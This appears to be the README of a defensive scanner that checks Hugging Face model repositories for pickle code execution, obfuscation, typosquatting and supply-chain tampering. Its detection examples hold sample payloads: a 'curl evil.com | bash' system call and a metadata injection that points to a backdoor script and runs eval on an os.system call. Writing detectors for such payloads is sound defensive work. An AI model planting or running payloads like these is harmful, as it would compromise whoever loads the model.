# HF Model Provenance Scanner

**Stdlib-Only ML Supply Chain Security Scanner for Hugging Face Model Repositories**

## Overview
Zero-dependency scanner detecting pickle RCE, source code attacks, obfuscation, format abuse, org impersonation, supply chain signals, rug-pull attacks, and environmental gating in Hugging Face model repositories.

## Detection Coverage

| Category | Attacks Detected | Engine |
|----------|------------------|--------|
| **Pickle RCE** | os.system, subprocess, eval, exec, __import__, 7 PickleScan bypasses | Binary parser (opcode analysis) |
| **Source Code** | Base64, PowerShell C2, SSL bypass, credential theft | AST + Taint + Symbolic |
| **Obfuscation** | chr() chains, rot13, base85, getattr, ctypes, lambda+map, generators | Symbolic resolver + sandbox |
| **Format Abuse** | SafeTensors metadata, GGUF shell cmds, Keras Lambda layers | Format parsers |
| **Org Impersonation** | Typosquatting (Levenshtein/prefix), model card plagiarism, velocity anomaly | Org checker |
| **Supply Chain** | Missing sigs, SBOM mismatches, unpinned deps, unsafe Dockerfiles | Provenance engine |
| **Rug-Pull** | New malicious files post-trust, removed security artifacts | Temporal baseline |
| **Environmental Gating** | Payloads behind platform/CI/env checks | Multi-env sandbox |

## Architecture: 5 Independent Engines

```
Untrusted Code → [AST Patterns] → [Taint Tracking] → [Symbolic Resolver] → [Sandbox] → [Binary Parsers]
                     ↓                  ↓                   ↓                ↓              ↓
              Known patterns      Dataflow to sinks   Resolve obfuscation  Execute & observe  Parse opcodes
```

## Quick Start

```bash
# Install (stdlib only - no deps!)
pip install -e .

# Scan local model
hf-scanner ./my-model --mode local --fail-on high

# Scan HuggingFace repo
hf-scanner meta-llama/Llama-3-8B --mode remote --format json

# CI integration
hf-scanner . --mode local --format sarif --output results.sarif
```

## Verified Detection Results

| Test Suite | Attacks | Detected | FP |
|------------|---------|----------|----|
| Core CVEs | 12 | 12 (100%) | 0 |
| Extended variants | 18 | 18 (100%) | 0 |
| Large-scale (multi-MB, 300-line, 288-tensor) | 3 | 3 (100%) | 0 |
| Real HF models (GPT-2, Llama-3) | 2 | 0 findings ✅ | 0 |

## Usage

### Local Scan
```bash
hf-scanner ./my-model-dir --mode local --fail-on high
```

### Remote Scan (HF Hub)
```bash
hf-scanner meta-llama/Llama-3-8B --mode remote --format json

# Gated repo (needs token)
export HF_TOKEN=hf_xxx
hf-scanner my-org/private-model --mode remote
```

### SBOM Generation
```bash
hf-scanner ./model --mode local --aibom --sbom-format cyclonedx --output sbom.json
```

### mTLS Verification
```bash
hf-scanner ./model --mode local --verify-signatures --cert-identity user@example.com --cert-oidc-issuer https://token.actions.githubusercontent.com
```

### Rug-Pull Detection
```bash
# Baseline
hf-scanner ./model --save-baseline baseline.json

# Later: detect changes
hf-scanner ./model --baseline baseline.json
```

## Output Formats

| Format | Use Case |
|--------|----------|
| `--format text` | Human review |
| `--format json` | CI/CD parsing |
| `--format sarif` | GitHub Code Scanning |
| `--format html` | Standalone report |

## CI/CD Integration

### GitHub Actions
```yaml
- uses: poojakira/hf-scanner-action@v1
  with:
    model_path: ./models
    fail_on: high
    format: sarif
```

### GitLab CI
```yaml
scan_model:
  script:
    - hf-scanner $MODEL_PATH --mode local --format json --output report.json
  artifacts:
    reports:
      sast: report.json
```

## Verified Detection Examples

### Pickle RCE
```python
# Detected: os.system("curl evil.com | bash")
# Opcode: GLOBAL os system / GLOBAL builtins eval
```

### SafeTensors Metadata Injection
```json
{
  "__metadata__": {
    "malicious_hook": "https://evil.com/backdoor.sh",
    "description": "eval(__import__('os').system('id'))"
  }
}
```

### Typosquatting
```
meta-llama/Llama-2-7b-hf    ✅ Legit
meta-llama/LIama-2-7b-hf    🚨 Typosquat (capital i)
meta-llama/Llama-2-7b-hf    🚨 Trailing space
```

## Requirements

**Zero runtime dependencies** — Python 3.9+ stdlib only

## Performance

| Model Size | Scan Time | Memory |
|------------|-----------|--------|
| 100MB | ~2s | 50MB |
| 1GB | ~15s | 200MB |
| 10GB | ~2min | 500MB |

Streaming mode: O(1) memory for large files

## Limitations

- No dynamic analysis of compiled extensions (.so, .dll)
- Remote scan limited to public files without token
- Sandbox execution best-effort (timeout 30s)
- Environmental gating: cannot see behind unreachable conditions

## License

Apache 2.0